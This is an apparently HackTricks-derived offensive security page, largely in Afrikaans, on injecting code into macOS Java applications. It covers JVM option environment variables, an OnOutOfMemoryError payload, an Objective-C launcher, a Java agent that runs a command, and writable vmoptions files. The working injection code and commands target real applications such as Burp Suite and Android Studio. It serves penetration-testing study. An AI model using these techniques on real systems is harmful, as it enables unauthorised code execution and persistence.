# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumerasie

Vind Java-toepassings wat op jou stelsel geïnstalleer is. Daar is opgemerk dat Java-toepassings in die **Info.plist** sommige Java-parameters sal bevat wat die string **`java.`** bevat, dus kan jy daarvoor soek:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Die omgewingsveranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre Java VM-parameters in te spuit wanneer ’n Java-toepassing begin.<sup>[[1]](#references)</sup>

Die Java launch stack herken ook twee beter gedefinieerde veranderlikes met verskillende omvang:

- `JAVA_TOOL_OPTIONS` word gelees wanneer die VM geskep word, insluitend sommige ingebedde launch paths wat nie deur die `java` launcher gaan nie. Dit kan instrumentation-opsies soos `-javaagent`, `-agentlib` of `-agentpath` inspuit.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` word deur die `java` launcher vooraan sy command line geplaas. Opsies wat die main class kies of die launcher beëindig, word verbied, maar `-javaagent` word aanvaar.<sup>[[5]](#references)</sup>

Al drie veranderlikes moet as JVM-kode-uitvoeringskontroles behandel word wanneer ’n aanvaller ook ’n versoenbare leesbare agent kan verskaf. `_JAVA_OPTIONS` is ’n HotSpot-implementeringsdetail, dus moet dit teen die presiese vendor en weergawe gevalideer word; `JAVA_TOOL_OPTIONS` of `JDK_JAVA_OPTIONS` is verkieslik vir portable testing.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Om dit as 'n nuwe proses uit te voer en nie as 'n child van die huidige terminaal nie, kan jy gebruik:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Daardie tegniek veroorsaak egter 'n fout in die uitgevoerde toepassing. 'n Meer stealthy alternatief is om 'n Java agent te skep en `-javaagent` te gebruik:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> As die agent met 'n **ander Java-weergawe** as dié van die toepassing geskep word, kan dit beide die agent en die toepassing laat crash.

Waar die agent kan wees:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Om die agent te compileer, voer uit:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Met `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
En voer dan die env-veranderlike uit en hardloop die Java-toepassing soos volg:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions-lêer

Hierdie lêer ondersteun die spesifikasie van **Java-parameters** wanneer Java uitgevoer word. Jy kan sommige van die vorige tegnieke gebruik om die Java-parameters te verander en **die proses arbitrêre opdragte te laat uitvoer**.\
Verder kan hierdie lêer ook **ander lêers insluit** met die `include`-direktief, dus kan jy ook ’n ingeslote lêer verander.

Wat meer is, sommige Java-apps sal **meer as een `vmoptions`-lêer laai**.

Sommige toepassings, soos Android Studio, dui in hul **afvoer aan waar hulle** na hierdie lêers soek:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
As hulle dit nie doen nie, kan jy daarvoor kyk met:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Let daarop dat Android Studio in hierdie voorbeeld probeer om **`/Applications/Android Studio.app.vmoptions`** te laai, ’n ligging waar enige gebruiker in die **`admin`-groep skryftoegang het**.

## References

- [1] [OpenJDK — ontleding van `_JAVA_OPTIONS` in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — pakketspesifikasie vir `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Konfigurasie van JVM-opsies en platformeienskappe](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Die `java` launcher — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
